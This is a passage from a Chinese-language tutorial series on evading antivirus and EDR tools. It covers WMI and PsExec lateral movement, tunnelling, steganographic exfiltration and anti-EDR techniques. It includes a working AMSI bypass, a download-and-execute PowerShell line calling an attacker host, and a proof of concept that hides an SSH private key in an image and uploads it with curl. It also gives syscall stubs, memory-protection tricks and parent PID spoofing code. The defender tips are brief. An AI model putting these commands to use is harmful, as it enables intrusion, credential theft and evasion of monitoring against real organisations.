<h3 id="4-WMIC-和-PsExec-的规避策略"><a href="#4-WMIC-和-PsExec-的规避策略" class="headerlink" title="4. WMIC 和 PsExec 的规避策略"></a><strong>4. WMIC 和 PsExec 的规避策略</strong></h3><h4 id="4-1-WMIC-规避：使用-WMI-vbs-代替-wmic-exe"><a href="#4-1-WMIC-规避：使用-WMI-vbs-代替-wmic-exe" class="headerlink" title="4.1 WMIC 规避：使用 WMI.vbs 代替 wmic.exe"></a><strong>4.1 WMIC 规避：使用 WMI.vbs 代替 <code>wmic.exe</code></strong></h4><p>WMIC 可以通过 WMI COM 对象或脚本调用来访问。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-built_in">Get-WmiObject</span> Win32_Process <span class="hljs-literal">-ComputerName</span> TAR<span class="hljs-built_in">GET-PC</span>).Create(<span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>这避免了启动 <code>wmic.exe</code> 并绕过了命令行检测规则。</p>
<hr>
<h4 id="4-2-PsExec-规避：使用-Impacket-的-psexec-py（Python）"><a href="#4-2-PsExec-规避：使用-Impacket-的-psexec-py（Python）" class="headerlink" title="4.2 PsExec 规避：使用 Impacket 的 psexec.py（Python）"></a><strong>4.2 PsExec 规避：使用 Impacket 的 <code>psexec.py</code>（Python）</strong></h4><p><strong>Impacket 工具包</strong> 包含 <code>psexec.py</code>，它是 PsExec 的重实现，不会将二进制文件写入磁盘：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 psexec.py DOMAIN/user:password@TARGET-PC<br></code></pre></td></tr></table></figure>

<p>优点：</p>
<ul>
<li><p>使用 SMB 但不会显式丢弃 <code>PSEXESVC.exe</code></p>
</li>
<li><p>绕过许多基于签名的检测</p>
</li>
<li><p>可以轻松在流量中混淆</p>
</li>
</ul>
<hr>
<h4 id="4-3-服务滥用代替-PsExec"><a href="#4-3-服务滥用代替-PsExec" class="headerlink" title="4.3 服务滥用代替 PsExec"></a><strong>4.3 服务滥用代替 PsExec</strong></h4><p>如果 PsExec 被阻止，攻击者可以通过 SCM 手动创建服务：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sc.exe \\TAR<span class="hljs-built_in">GET-PC</span> create MyService binPath= <span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span><br>sc.exe \\TAR<span class="hljs-built_in">GET-PC</span> <span class="hljs-built_in">start</span> MyService<br></code></pre></td></tr></table></figure>

<p>这模仿了 PsExec 的行为，但避免了 PsExec 的痕迹。</p>
<hr>
<h3 id="5-生活在土地上的替代方法"><a href="#5-生活在土地上的替代方法" class="headerlink" title="5. 生活在土地上的替代方法"></a><strong>5. 生活在土地上的替代方法</strong></h3><p>除了 WMIC&#x2F;PsExec，攻击者还可以使用以下方法：</p>
<table>
<thead>
<tr>
<th>技术</th>
<th>命令</th>
<th>隐蔽性</th>
</tr>
</thead>
<tbody><tr>
<td>WMI COM 对象</td>
<td><code>$wmi = [WMIClass] &quot;\\TARGET\root\cimv2\_Process&quot;</code></td>
<td>高</td>
</tr>
<tr>
<td>远程注册表</td>
<td><code>reg.exe connect \\TARGET</code></td>
<td>中</td>
</tr>
<tr>
<td>WinRM + PS 远程执行</td>
<td><code>Enter-PSSession</code> 或 <code>Invoke-Command</code></td>
<td>中</td>
</tr>
</tbody></table>
<hr>
<h3 id="6-真实世界的规避链示例"><a href="#6-真实世界的规避链示例" class="headerlink" title="6. 真实世界的规避链示例"></a><strong>6. 真实世界的规避链示例</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># AMSI 绕过</span><br>[<span class="hljs-type">Ref</span>].Assembly.GetType(<span class="hljs-string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="hljs-string">&#x27;amsiInitFailed&#x27;</span>,<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br><br><span class="hljs-comment"># 加载编码的 PowerSploit 脚本</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://attacker-host/Invoke-WMI.ps1&quot;</span>)<br><br><span class="hljs-comment"># 在远程执行一个 Shell</span><br><span class="hljs-built_in">Invoke-WmiCommand</span> <span class="hljs-literal">-ComputerName</span> TAR<span class="hljs-built_in">GET-PC</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;powershell -enc &lt;payload&gt;&quot;</span><br></code></pre></td></tr></table></figure>

<p>整个链条避免了 PsExec，记录的事件更少，且载荷保持在内存中。</p>
<hr>
<h3 id="7-防御者建议"><a href="#7-防御者建议" class="headerlink" title="7. 防御者建议"></a><strong>7. 防御者建议</strong></h3><ul>
<li><p><strong>通过 AppLocker 或 WDAC 规则阻止 PsExec</strong></p>
</li>
<li><p><strong>监控内部端点的 SMB 使用</strong>（PsExec 使用 SMB）</p>
</li>
<li><p><strong>标记网络上的 WMI 使用</strong>，尤其是由非管理员端点发起时</p>
</li>
<li><p><strong>警报横向移动模式</strong>：异常的登录、服务创建、远程进程启动</p>
</li>
</ul>
<hr>
<h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><p>WMIC 和 PsExec 被广泛滥用进行横向渗透。</p>
</li>
<li><p>EDR 专注于事件关联（进程创建、服务创建）。</p>
</li>
<li><p>有效的规避依赖于远离内建工具或使用隐蔽的变体（如 Impacket）。</p>
</li>
<li><p>PowerShell + AMSI 绕过 + WMI &#x3D; 无痕、无磁盘的远程执行链。</p>
</li>
</ul>
<h2 id="AV-EDR规避实战技巧-9-6-隧道技术、混淆与隐蔽通信通道"><a href="#AV-EDR规避实战技巧-9-6-隧道技术、混淆与隐蔽通信通道" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 9.6 - 隧道技术、混淆与隐蔽通信通道"></a>AV&#x2F;EDR规避实战技巧 - 9.6 - 隧道技术、混淆与隐蔽通信通道</h2><h3 id="目标-8"><a href="#目标-8" class="headerlink" title="目标"></a><strong>目标</strong></h3><p>本课程介绍攻击者用于 <strong>绕过外围安全和EDR行为检测</strong> 的技术，通过创建隐蔽的通信通道和将流量隐藏在看似合法的网络流中。</p>
<hr>
<h3 id="1-隧道技术概述"><a href="#1-隧道技术概述" class="headerlink" title="1. 隧道技术概述"></a><strong>1. 隧道技术概述</strong></h3><p>隧道技术指的是将数据或命令封装在另一种协议中，以 <strong>绕过监控</strong> 或 <strong>过滤机制</strong>。</p>
<h4 id="常见例子："><a href="#常见例子：" class="headerlink" title="常见例子："></a><strong>常见例子：</strong></h4><ul>
<li><p><strong>DNS 隧道</strong></p>
<ul>
<li><p>将有效载荷或命令与控制（C2）通信编码在 DNS 查询中。</p>
</li>
<li><p>工具：<code>dnscat2</code>、<code>iodine</code>、<code>Heyoka</code>、自定义 PowerShell DNS C2 脚本</p>
</li>
</ul>
</li>
<li><p><strong>HTTP(S) 隧道</strong></p>
<ul>
<li><p>使用加密的 Web 请求来伪装恶意通信。</p>
</li>
<li><p>模拟浏览器流量的常见头信息</p>
</li>
<li><p>通过 HTTPS 或 Cloudfront CDN 进行 C2 通信</p>
</li>
</ul>
</li>
<li><p><strong>ICMP 隧道</strong></p>
<ul>
<li><p>将隐蔽的 shell 流量嵌入到 ping 请求中。</p>
</li>
<li><p>示例：<code>icmp_backdoor.py</code> 或原始套接字实现</p>
</li>
</ul>
</li>
</ul>
<h4 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a><strong>真实案例</strong></h4><p>APT32（OceanLotus）利用 DNS 隧道保持 C2 连接，同时绕过基于代理的防火墙。</p>
<hr>
<h3 id="2-网络负载的混淆"><a href="#2-网络负载的混淆" class="headerlink" title="2. 网络负载的混淆"></a><strong>2. 网络负载的混淆</strong></h3><p>除了 PowerShell 或二进制混淆，传输中的负载也可以：</p>
<ul>
<li><p><strong>Base64 编码</strong></p>
</li>
<li><p><strong>使用 XOR 或 AES 加密</strong></p>
</li>
<li><p><strong>分块或嵌入到看似无害的格式中</strong></p>
</li>
</ul>
<h4 id="示例-–-PowerShell-负载在-HTTP-POST-中传输："><a href="#示例-–-PowerShell-负载在-HTTP-POST-中传输：" class="headerlink" title="示例 – PowerShell 负载在 HTTP POST 中传输："></a><strong>示例 – PowerShell 负载在 HTTP POST 中传输：</strong></h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>api.trusted-domain.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;U3lzdGVtLk5ldC5XZWJDbGllbnQ=&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>

<h3 id="混淆和隧道工具"><a href="#混淆和隧道工具" class="headerlink" title="混淆和隧道工具"></a><strong>混淆和隧道工具</strong></h3><ul>
<li><p><code>Invoke-Obfuscation</code></p>
</li>
<li><p><code>Chisel</code>（反向 SOCKS 隧道）</p>
</li>
<li><p><code>nishang</code>（反向 HTTP）</p>
</li>
<li><p><code>socat</code>、<code>reGeorg</code>、<code>ligolo-ng</code>、<code>pivotnacci</code></p>
</li>
</ul>
<hr>
<h3 id="3-隐蔽通道"><a href="#3-隐蔽通道" class="headerlink" title="3. 隐蔽通道"></a><strong>3. 隐蔽通道</strong></h3><p>隐蔽通道是嵌入在 <strong>合法协议或系统行为中的隐藏通信通道</strong>。</p>
<h4 id="常见示例："><a href="#常见示例：" class="headerlink" title="常见示例："></a><strong>常见示例：</strong></h4><ul>
<li><p><strong>隐写命令与控制（C2）</strong> – 将负载隐藏在图片元数据或像素中</p>
</li>
<li><p><strong>基于电子邮件的 C2</strong> – 将命令隐藏在主题行中</p>
</li>
<li><p><strong>Slack、Discord 机器人</strong> – 使用聊天 API 作为 C2 通道</p>
</li>
<li><p><strong>命名管道 &#x2F; SMB &#x2F; RPC 隐蔽通道</strong></p>
</li>
</ul>
<h4 id="高级示例-–-图像隐写隧道"><a href="#高级示例-–-图像隐写隧道" class="headerlink" title="高级示例 – 图像隐写隧道"></a><strong>高级示例 – 图像隐写隧道</strong></h4><ol>
<li><p>攻击者将负载编码到 JPEG 图像中，使用最低有效位（LSB）。</p>
</li>
<li><p>通过 Dropbox 或 Slack 发送图像。</p>
</li>
<li><p>恶意软件在客户端解码负载。</p>
</li>
</ol>
<hr>
<h3 id="4-检测挑战"><a href="#4-检测挑战" class="headerlink" title="4. 检测挑战"></a><strong>4. 检测挑战</strong></h3><p>大多数 EDR 聚焦于：</p>
<ul>
<li><p>API 挂钩</p>
</li>
<li><p>基于签名的 IOC</p>
</li>
<li><p>Sysmon 日志记录</p>
</li>
<li><p>命令行监控</p>
</li>
</ul>
<p>但它们往往 <strong>无法关联隐蔽协议或通道</strong>，尤其是当流量看起来是合法时。</p>
<h4 id="规避提示"><a href="#规避提示" class="headerlink" title="规避提示"></a><strong>规避提示</strong></h4><p>使用域前置（CDN）、被动 DNS 或 TLS SNI 轮换与隧道技术结合。</p>
<hr>
<h3 id="5-真实世界模拟演练"><a href="#5-真实世界模拟演练" class="headerlink" title="5. 真实世界模拟演练"></a><strong>5. 真实世界模拟演练</strong></h3><p><strong>目标：</strong> 创建一个 DNS 隧道，以通过隧道外泄一个小的 ZIP 文件。</p>
<ul>
<li><p><strong>工具：</strong> <code>iodine</code>，自定义 DNS 服务器</p>
</li>
<li><p><strong>步骤：</strong></p>
<ol>
<li><p>使用子域设置 iodine 服务器。</p>
</li>
<li><p>在受害者机器上运行 iodine 客户端。</p>
</li>
<li><p>使用 <code>scp</code> 或 <code>curl</code> 通过隧道外泄 ZIP 文件。</p>
</li>
</ol>
</li>
</ul>
<hr>
<h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><p>隧道技术和混淆方法是绕过 AV&#x2F;EDR 的强大手段。</p>
</li>
<li><p>攻击者通过将恶意流量嵌入合法协议或隐藏于看似无害的网络流中，来规避检测。</p>
</li>
<li><p>结合 DNS、HTTP 和 ICMP 隧道、混淆技术以及隐写通道，攻击者能够高效地隐蔽通信。</p>
</li>
<li><p>对于防御者来说，识别隐蔽通道和流量模式，以及加强网络流量监控，是提高安全性的重要手段。</p>
</li>
</ul>
<h2 id="AV-EDR规避实战技巧-9-7-通过隐写术进行隐蔽的数据外泄"><a href="#AV-EDR规避实战技巧-9-7-通过隐写术进行隐蔽的数据外泄" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 9.7 - 通过隐写术进行隐蔽的数据外泄"></a>AV&#x2F;EDR规避实战技巧 - 9.7 - 通过隐写术进行隐蔽的数据外泄</h2><h3 id="目标-9"><a href="#目标-9" class="headerlink" title="目标"></a><strong>目标</strong></h3><p>本模块介绍了攻击者如何利用 <strong>隐写术</strong> 来隐蔽地外泄数据，同时绕过EDR、火墙和数据丢失防护（DLP）机制。其核心思路是将敏感数据嵌入到看似无害的文件中，例如图片、音频或视频文件，这些文件不容易引起警觉。</p>
<hr>
<h3 id="1-什么是隐写术？"><a href="#1-什么是隐写术？" class="headerlink" title="1. 什么是隐写术？"></a><strong>1. 什么是隐写术？</strong></h3><p>隐写术是将 <strong>秘密信息隐藏在另一个文件中</strong> 的艺术，目的是让信息的存在不易察觉。</p>
<p>与加密不同，隐写术不仅保护数据的机密性，还隐藏了数据的存在本身。加密会让数据的存在变得显而易见，而隐写术则使得数据的存在完全不可见。</p>
<hr>
<h3 id="2-常见的隐写数据外泄载体"><a href="#2-常见的隐写数据外泄载体" class="headerlink" title="2. 常见的隐写数据外泄载体"></a><strong>2. 常见的隐写数据外泄载体</strong></h3><ul>
<li><p><strong>图像文件（JPG、PNG、BMP）</strong></p>
</li>
<li><p><strong>音频文件（WAV、MP3）</strong></p>
</li>
<li><p><strong>视频文件（MP4、AVI）</strong></p>
</li>
<li><p><strong>文本文件（PDF、HTML）</strong></p>
</li>
</ul>
<hr>
<h3 id="3-真实世界的使用案例"><a href="#3-真实世界的使用案例" class="headerlink" title="3. 真实世界的使用案例"></a><strong>3. 真实世界的使用案例</strong></h3><ul>
<li><p><strong>APT28&#x2F;Fancy Bear</strong> 使用基于图像的隐写术从被攻陷的政府系统中外泄凭证。</p>
</li>
<li><p><strong>Turla Group</strong> 利用嵌入Shellcode的PNG图像附件进行外泄。</p>
</li>
</ul>
<hr>
<h3 id="4-隐写外泄工具"><a href="#4-隐写外泄工具" class="headerlink" title="4. 隐写外泄工具"></a><strong>4. 隐写外泄工具</strong></h3><h4 id="a-steghide"><a href="#a-steghide" class="headerlink" title="a. steghide"></a><strong>a. steghide</strong></h4><p>经典的命令行隐写工具，支持将数据嵌入到 JPEG、BMP、WAV 和 AU 文件中。</p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide embed -cf image.jpg -ef secret.zip -p hunter2<br></code></pre></td></tr></table></figure>

<p>提取数据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf image.jpg -p hunter2<br></code></pre></td></tr></table></figure>

<h4 id="b-OutGuess"><a href="#b-OutGuess" class="headerlink" title="b. OutGuess"></a><strong>b. OutGuess</strong></h4><p>更先进的图像隐写术工具，具有更强的抗检测能力。</p>
<h4 id="c-zsteg"><a href="#c-zsteg" class="headerlink" title="c. zsteg"></a><strong>c. zsteg</strong></h4><p>用于检测 PNG 和 BMP 文件中的隐藏内容。</p>
<h4 id="d-Invoke-Steganography-PowerShell"><a href="#d-Invoke-Steganography-PowerShell" class="headerlink" title="d. Invoke-Steganography (PowerShell)"></a><strong>d. Invoke-Steganography (PowerShell)</strong></h4><p>基于 PowerShell 的隐写工具，用于嵌入和提取数据。</p>
<hr>
<h3 id="5-外泄工作流程（TTP）"><a href="#5-外泄工作流程（TTP）" class="headerlink" title="5. 外泄工作流程（TTP）"></a><strong>5. 外泄工作流程（TTP）</strong></h3><ol>
<li><p><strong>收集数据：</strong>凭证、截图、ZIP文件等</p>
</li>
<li><p><strong>压缩和加密（可选）：</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -e secrets.zip passwords.txt  <br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>嵌入到图像中：</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide embed -cf wallpaper.jpg -ef secrets.zip -p hide123  <br></code></pre></td></tr></table></figure>

<ol start="4">
<li><p><strong>通过网络上传&#x2F;电子邮件&#x2F;聊天应用&#x2F;云存储外泄：</strong></p>
<ul>
<li><p>Slack</p>
</li>
<li><p>Discord</p>
</li>
<li><p>Dropbox</p>
</li>
<li><p>Gmail</p>
</li>
</ul>
</li>
<li><p><strong>攻击者下载并提取隐写负载。</strong></p>
</li>
</ol>
<hr>
<h3 id="6-高级隐写通道"><a href="#6-高级隐写通道" class="headerlink" title="6. 高级隐写通道"></a><strong>6. 高级隐写通道</strong></h3><ul>
<li><p><strong>LSB（最低有效位）操作</strong></p>
</li>
<li><p><strong>附加负载（EOF技巧）</strong></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> image.jpg private_key.pem &gt; final.jpg  <br></code></pre></td></tr></table></figure>

<ul>
<li><strong>元数据字段（EXIF）</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool -comment=<span class="hljs-string">&quot;http://pastebin.com/abc123&quot;</span> image.jpg  <br></code></pre></td></tr></table></figure>

<ul>
<li><p><strong>脚本驱动的自动化</strong></p>
<ul>
<li><p>批量处理敏感文件</p>
</li>
<li><p>随机化载体和密码密钥</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="7-检测规避"><a href="#7-检测规避" class="headerlink" title="7. 检测规避"></a><strong>7. 检测规避</strong></h3><ul>
<li><p>通过隐写嵌入的负载通常 <strong>不会触发 DLP</strong> 或杀毒软件的启发式检测。</p>
</li>
<li><p>加密或压缩的负载进一步 <strong>混淆了检测</strong>。</p>
</li>
<li><p>使用 <strong>常见文件扩展名</strong>（如 .jpg、.png、.docx）降低了被检测的风险。</p>
</li>
</ul>
<hr>
<h3 id="8-PoC-隐藏-SSH-私钥到图像中"><a href="#8-PoC-隐藏-SSH-私钥到图像中" class="headerlink" title="8. PoC: 隐藏 SSH 私钥到图像中"></a><strong>8. PoC: 隐藏 SSH 私钥到图像中</strong></h3><p><strong>步骤：</strong></p>
<ol>
<li>准备私钥（例如，<code>id_rsa</code>）：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> ~/.ssh/id_rsa secret.key  <br></code></pre></td></tr></table></figure>

<ol start="2">
<li>将私钥嵌入图像：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide embed -cf cat.jpg -ef secret.key -p supersecret  <br></code></pre></td></tr></table></figure>

<ol start="3">
<li>上传图像到 Web&#x2F;云：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -F <span class="hljs-string">&quot;file=@cat.jpg&quot;</span> https://transfer.sh  <br></code></pre></td></tr></table></figure>

<ol start="4">
<li>在攻击者机器上：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://transfer.sh/abc/cat.jpg -o exfil.jpg  <br>steghide extract -sf exfil.jpg -p supersecret  <br></code></pre></td></tr></table></figure>

<p>现在，攻击者已获得 <code>id_rsa</code> 用于 SSH 透传。</p>
<hr>
<h3 id="9-检测与取证考虑"><a href="#9-检测与取证考虑" class="headerlink" title="9. 检测与取证考虑"></a><strong>9. 检测与取证考虑</strong></h3><ul>
<li><p>使用 <code>stegdetect</code>、<code>zsteg</code> 或对媒体文件进行异常分析。</p>
</li>
<li><p>监控来自非设计部门的大量图像&#x2F;音频上传。</p>
</li>
<li><p>检查 EXIF 元数据异常。</p>
</li>
</ul>
<hr>
<h3 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><p>隐写术是一种有效的隐蔽外泄数据的方式，可以绕过 AV、EDR 和 DLP 检测。</p>
</li>
<li><p>攻击者可以通过将敏感数据嵌入到图像、音频或视频等常见文件中，来避免被检测。</p>
</li>
<li><p>常用的隐写工具包括 steghide、OutGuess 和 PowerShell 隐写工具。</p>
</li>
<li><p>防御者可以通过分析文件元数据、监控异常上传活动来识别隐写外泄行为。</p>
</li>
</ul>
<h2 id="AV-EDR规避实战技巧-9-8-反EDR行为规避技巧"><a href="#AV-EDR规避实战技巧-9-8-反EDR行为规避技巧" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 9.8 - 反EDR行为规避技巧"></a>AV&#x2F;EDR规避实战技巧 - 9.8 - 反EDR行为规避技巧</h2><h3 id="目标-10"><a href="#目标-10" class="headerlink" title="目标"></a><strong>目标</strong></h3><p>本主题聚焦于攻击者在 <strong>后渗透阶段</strong> 使用的 <strong>高级技术</strong>，用于 <strong>绕过端点检测与响应（EDR）系统</strong>。这些技术不仅仅依赖于负载的混淆，而是利用 <strong>EDR监控和响应行为</strong> 的漏洞，使攻击者能够在未被发现的情况下持续操作。</p>
<hr>
<h3 id="1-了解-EDR-监控向量"><a href="#1-了解-EDR-监控向量" class="headerlink" title="1. 了解 EDR 监控向量"></a><strong>1. 了解 EDR 监控向量</strong></h3><p>EDR 监控以下内容：</p>
<ul>
<li><p>API 调用（用户态和内核态）</p>
</li>
<li><p>系统调用（通过钩子或内核驱动）</p>
</li>
<li><p>内存分配和保护变化</p>
</li>
<li><p>进程注入和父子进程关系</p>
</li>
<li><p>事件跟踪（ETW）</p>
</li>
</ul>
<hr>
<h3 id="2-常见的-EDR-检测策略"><a href="#2-常见的-EDR-检测策略" class="headerlink" title="2. 常见的 EDR 检测策略"></a><strong>2. 常见的 EDR 检测策略</strong></h3><ul>
<li><p><strong>用户态 API 钩子</strong>（例如：<code>CreateRemoteThread</code>, <code>NtWriteVirtualMemory</code>）</p>
</li>
<li><p><strong>DLL 注入检测</strong></p>
</li>
<li><p><strong>行为异常</strong>（例如：PowerShell + 编码命令）</p>
</li>
<li><p><strong>已知的 Shellcode 模式和熵分析</strong></p>
</li>
</ul>
<hr>
<h3 id="3-反-EDR-策略概述"><a href="#3-反-EDR-策略概述" class="headerlink" title="3. 反 EDR 策略概述"></a><strong>3. 反 EDR 策略概述</strong></h3><table>
<thead>
<tr>
<th>类别</th>
<th>技术</th>
</tr>
</thead>
<tbody><tr>
<td><strong>API 规避</strong></td>
<td>直接调用系统调用、间接系统调用存根</td>
</tr>
<tr>
<td><strong>内存规避</strong></td>
<td>分配为 RW → 写入 → 延迟后变更为 RX</td>
</tr>
<tr>
<td><strong>事件干扰</strong></td>
<td>解钩 ETW、AMSI 绕过</td>
</tr>
<tr>
<td><strong>进程技巧</strong></td>
<td>父 PID 欺骗、牺牲进程注入</td>
</tr>
<tr>
<td><strong>钩子检测</strong></td>
<td>枚举 EDR 钩子并修补</td>
</tr>
</tbody></table>
<hr>
<h3 id="4-直接系统调用-vs-API-钩子"><a href="#4-直接系统调用-vs-API-钩子" class="headerlink" title="4. 直接系统调用 vs. API 钩子"></a><strong>4. 直接系统调用 vs. API 钩子</strong></h3><p>EDR 常常钩住高层 API（如 <code>VirtualAllocEx</code> 或 <code>NtCreateThreadEx</code>）。一种规避方法是 <strong>直接使用系统调用</strong>，绕过用户态钩子。</p>
<p>使用系统调用存根（汇编）示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov r10, rcx<br>mov eax, &lt;syscall_number&gt;<br>syscall<br>ret<br></code></pre></td></tr></table></figure>

<p>可以使用 <strong>Hell’s Gate</strong> 或 <strong>SysWhispers2</strong> 动态解析系统调用。</p>
<hr>
<h3 id="5-AMSI-和-ETW-绕过"><a href="#5-AMSI-和-ETW-绕过" class="headerlink" title="5. AMSI 和 ETW 绕过"></a><strong>5. AMSI 和 ETW 绕过</strong></h3><h4 id="AMSI（反恶意软件扫描接口）绕过："><a href="#AMSI（反恶意软件扫描接口）绕过：" class="headerlink" title="AMSI（反恶意软件扫描接口）绕过："></a><strong>AMSI（反恶意软件扫描接口）绕过：</strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">Ref</span>].Assembly.GetType(<span class="hljs-string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="hljs-string">&#x27;amsiInitFailed&#x27;</span>,<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure>

<h4 id="ETW（事件跟踪-Windows）补丁："><a href="#ETW（事件跟踪-Windows）补丁：" class="headerlink" title="ETW（事件跟踪 Windows）补丁："></a><strong>ETW（事件跟踪 Windows）补丁：</strong></h4><p>修补 ETW 提供程序函数的开始部分，禁用遥测。</p>
<hr>
<h3 id="6-进程注入混淆"><a href="#6-进程注入混淆" class="headerlink" title="6. 进程注入混淆"></a><strong>6. 进程注入混淆</strong></h3><p>代替使用 <code>CreateRemoteThread</code>，可以使用以下技术：</p>
<ul>
<li><p><strong>APC 注入</strong></p>
</li>
<li><p><strong>线程劫持</strong></p>
</li>
<li><p><strong>内存映射区</strong></p>
</li>
<li><p><strong>进程空洞化</strong></p>
</li>
<li><p><strong>事务空洞化</strong>（使用 <code>NtCreateSection</code> + <code>NtMapViewOfSection</code>）</p>
</li>
</ul>
<p>这些技术在结合延迟执行、休眠或间接执行时（例如：通过 <code>NtTestAlert</code>）更难被检测。</p>
<hr>
<h3 id="7-内存保护规避"><a href="#7-内存保护规避" class="headerlink" title="7. 内存保护规避"></a><strong>7. 内存保护规避</strong></h3><p>通过更改内存保护流程来避免引起怀疑：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">VirtualAllocEx</span>(..., PAGE_READWRITE)<br><span class="hljs-built_in">WriteProcessMemory</span>(...)<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">10000</span>)  <span class="hljs-comment">// 延迟执行，绕过启发式检测</span><br><span class="hljs-built_in">VirtualProtectEx</span>(..., PAGE_EXECUTE_READ)<br></code></pre></td></tr></table></figure>

<p>EDR 通常会标记立即发生的 RW → RX 过渡。通过添加延迟和分离权限，绕过许多启发式规则。</p>
<hr>
<h3 id="8-钩子检测与移除"><a href="#8-钩子检测与移除" class="headerlink" title="8. 钩子检测与移除"></a><strong>8. 钩子检测与移除</strong></h3><p>扫描已加载 DLL 的内存（例如 <code>ntdll.dll</code>）以查找已被覆盖的字节（钩子的标志）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ReadProcessMemory</span>(..., ntdll + offset, buffer, size, &amp;read)<br>Compare against clean disk copy<br></code></pre></td></tr></table></figure>

<p>如果发现钩子：</p>
<ul>
<li><p>修补它们（风险高，可能被检测）</p>
</li>
<li><p>使用 <strong>系统调用存根</strong> 代替</p>
</li>
</ul>
<hr>
<h3 id="9-父-PID-欺骗"><a href="#9-父-PID-欺骗" class="headerlink" title="9. 父 PID 欺骗"></a><strong>9. 父 PID 欺骗</strong></h3><p>通过伪造父进程来启动进程，避免引起怀疑：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">STARTUPINFOEX si = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-built_in">UpdateProcThreadAttribute</span>(..., PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)<br></code></pre></td></tr></table></figure>

